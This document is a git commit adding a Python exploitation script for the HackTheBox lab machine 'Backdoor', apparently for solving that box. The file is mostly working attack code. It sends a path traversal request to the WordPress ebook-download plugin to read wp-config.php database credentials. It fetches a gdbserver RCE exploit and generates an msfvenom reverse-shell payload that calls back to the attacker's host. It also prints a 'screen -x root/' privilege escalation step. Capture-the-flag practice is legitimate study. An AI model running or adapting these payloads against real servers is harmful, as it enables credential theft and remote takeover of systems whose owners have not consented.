5e544bb8d91ff61b02e4731ab2f64673c75bf4d6
l44x <138518422+l44x@users.noreply.github.com>
2025-05-10 11:43:28 -0500

    Create Backdoor-pwn3dRoot.py

---
+++ Backdoor-pwn3dRoot.py
@@ -0,0 +1,159 @@
+import sys, os, requests, re, subprocess, paramiko
+import time as cm
+from colorama import Fore, init
+from datetime import datetime
+from questionary import Style, select
+from consolemenu import SelectionMenu
+from sshtunnel import SSHTunnelForwarder
+
+class Tmsg:
+    def __str__(self):
+        return (Fore.LIGHTMAGENTA_EX + "⇛ [" +
+                Fore.CYAN + datetime.now().strftime("%H:%M:%S") +
+                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
+                Fore.LIGHTMAGENTA_EX + "[" + Fore.WHITE + "P4n3l" +
+                Fore.LIGHTMAGENTA_EX + "]" + Fore.YELLOW + "-" +
+                Fore.LIGHTMAGENTA_EX + "[" + Fore.LIGHTGREEN_EX + "~" +
+                Fore.LIGHTMAGENTA_EX + "]" + Fore.LIGHTGREEN_EX + " ➤" + Fore.RESET)
+
+init(autoreset=True)
+custom_style = Style([
+    ('qmark', 'fg:#FF5F87 bold'),
+    ('question', 'fg:#017cff bold'),             
+    ('answer', 'fg:#01ff4e bold'),     
+    ('pointer', 'fg:#fbff00 bold'),    
+    ('highlighted', 'fg:#00FFFF bold'),
+    ('selected', 'fg:#22b9c5 bold'),        
+    ('separator', 'fg:#6C6C6C bold'),
+])
+
+global machine_ip
+global target_machine
+global ln
+
+def banner():
+    os.system("clear")
+    bnn = """
+    
+    ▓█████  ▄████▄   ██░ ██  ██ ▄█▀ ███▄ ▄███▓ ▒█████   █    ██   ██████ 
+    ▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒ ██▄█▒ ▓██▒▀█▀ ██▒▒██▒  ██▒ ██  ▓██▒▒██    ▒ 
+    ▒███   ▒▓█    ▄ ▒██▀▀██░▓███▄░ ▓██    ▓██░▒██░  ██▒▓██  ▒██░░ ▓██▄   
+    ▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▓██ █▄ ▒██    ▒██ ▒██   ██░▓▓█  ░██░  ▒   ██▒
+    ░▒████▒▒ ▓███▀ ░░▓█▒░██▓▒██▒ █▄▒██▒   ░██▒░ ████▓▒░▒▒█████▓ ▒██████▒▒
+    ░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒▒ ▒▒ ▓▒░ ▒░   ░  ░░ ▒░▒░▒░ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
+     ░ ░  ░  ░  ▒    ▒ ░▒░ ░░ ░▒ ▒░░  ░      ░  ░ ▒ ▒░ ░░▒░ ░ ░ ░ ░▒  ░ ░
+       ░   ░         ░  ░░ ░░ ░░ ░ ░      ░   ░ ░ ░ ▒   ░░░ ░ ░ ░  ░  ░  
+       ░  ░░ ░       ░  ░  ░░  ░          ░       ░ ░     ░           ░  
+           ░                                                             
+    __________________________________________________________________________
+    [+] Author: Ech0k   [+] G1thub: github.com/l44x   [+] T00l: HTB-Backdoor
+    __________________________________________________________________________\n"""
+    print(Fore.RED + f"{bnn}")
+
+tmsg = Tmsg()
+ln = Fore.GREEN+"========================================="+Fore.RESET
+
+def menu_panel():
+    options=["[+] www-data", "[+] user", "[+] root", "[-] exit"]
+    opcion = select(
+        "Selecciona una opción:",
+        choices=options,
+        style=custom_style
+    ).ask()
+        
+    return [opcion,options]
+
+def commands_send(cmd):
+    try:
+        #subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        result = subprocess.run(cmd, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        return result.stdout.strip()
+    except subprocess.CalledProcessError as e:
+        print(f"OcurredErr0r {e}")
+
+def hmsg(user,msg):
+    return Fore.YELLOW+"["+Fore.GREEN+"@"+Fore.WHITE+f"{user}"+Fore.YELLOW+"]"+Fore.GREEN+"-"+Fore.YELLOW+"["+Fore.LIGHTMAGENTA_EX+"♛ "+Fore.WHITE+f"{msg}"+Fore.YELLOW+"]"
+
+#------------------------------------------------------------------------
+
+machine_ip=commands_send('ifconfig | grep destination | awk \'NF{print $NF}\'')
+target_machine="10.10.11.125" # change this if change ip on htb.
+
+
+def checker_status():
+    try:
+        check_hackthebox_vpn="ifconfig | grep tun0"
+        control_status_vpn=commands_send(check_hackthebox_vpn)
+        cm.sleep(.5)
+        if control_status_vpn:
+            print(ln)
+            print(tmsg,Fore.RED + f"[HackTheBoxVPN] > " + Fore.GREEN + f"Successful Connection ;)")
+        else:
+            print(tmsg,Fore.RED + f"[!] Actve ur HackTheBox VPN")
+            sys.exit(1)
+    except subprocess.CalledProcessError as e:
+        print(tmsg,f"OcurredErr0r [Vpn-Status] {e}")
+
+def default_cred_user():
+    try:
+        whoami_default=commands_send('whoami')
+        machine_default_ip=commands_send(f'ping -c 1 {machine_ip} | grep "1 received" ');print(ln)
+        print(tmsg,hmsg("user","Default User connection"))
+        print(tmsg,Fore.RED + f"[HackTheBox - IP] > " + Fore.YELLOW + f"{machine_ip}")
+        print(tmsg,Fore.RED + f"[User-default] > " + Fore.YELLOW + f"{whoami_default}")
+        if machine_default_ip:
+            print(tmsg,Fore.RED + f"[Target Machine] > " + Fore.YELLOW + f"{target_machine}")
+            print(tmsg,Fore.RED + f"[Target Path Exploit] > " + Fore.YELLOW + f"http://{target_machine}");print(ln)
+        else:
+            print(tmsg,Fore.RED + f"\t\t\t[Target Machine] > " + Fore.RED + f"Checked Backdoor Network");print(ln)
+    except subprocess.CalledProcessError as e:
+        print(f"OcurredErr0r [User-Default] {e}")
+        
+#------------------------------------------------------------------------
+
+
+def wordpress_plugin_path_traversal():
+    print(commands_send(f"curl -s -X GET 'http://{target_machine}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php' | grep \"define( 'DB\"  "))
+
+
+def gdbserver_exploit_rce():
+    commands_send("searchsploit -m linux/remote/50539.py && mv 50539.py gdb_server.py")
+    commands_send(f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={machine_ip} LPORT=443 PrependFork=true -o rev.bin")
+    print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.LIGHTMAGENTA_EX + f"Please listen on port 443");cm.sleep(0.2)
+    input(str(tmsg)+Fore.LIGHTBLUE_EX + f" [www-data] > " + Fore.WHITE + f"Press ENTER if u ready now...")
+    commands_send(f"python3 gdb_server.py {target_machine}:1337 rev.bin")
+    
+#------------------------------------------------------------------------
+
+def undected():
+    try:
+        checker_status();cm.sleep(.8)
+        default_cred_user();cm.sleep(.8)
+        print(Fore.YELLOW+f"=========================================")
+        while True:
+            opcion = menu_panel()
+            print(Fore.YELLOW+f"=========================================")
+            if opcion[0] == opcion[1][0]:
+                print(tmsg,hmsg("user","www-data connection"))
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.YELLOW + f"Path Exploit: http://{target_machine}/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php");cm.sleep(0.2)
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.LIGHTMAGENTA_EX + f"✔ Exploit ebook download plugin");cm.sleep(0.2)
+                wordpress_plugin_path_traversal()
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[www-data] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln);cm.sleep(.2)
+            elif opcion[0] == opcion[1][1]:
+                print(tmsg,hmsg("user","user-Backdoor user connection"))
+                gdbserver_exploit_rce()
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[user-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
+            elif opcion[0] == opcion[1][2]:
+                print(tmsg,hmsg("user","root-Backdoor user connection"))
+                print(tmsg,Fore.RED + f"[Exploit Command] > " + Fore.YELLOW + f"type command on bash > screen -x root/")
+                print(tmsg,Fore.LIGHTBLUE_EX +f"[root-user] > " + Fore.GREEN + f"✔ G00d H4ch1ng Duhhmhm :3");print(ln)
+            elif opcion[0] == opcion[1][-1]:
+                break
+            else:
+                break
+    except:
+        pass
+    
+if __name__ == '__main__':
+    banner()
+    undected()
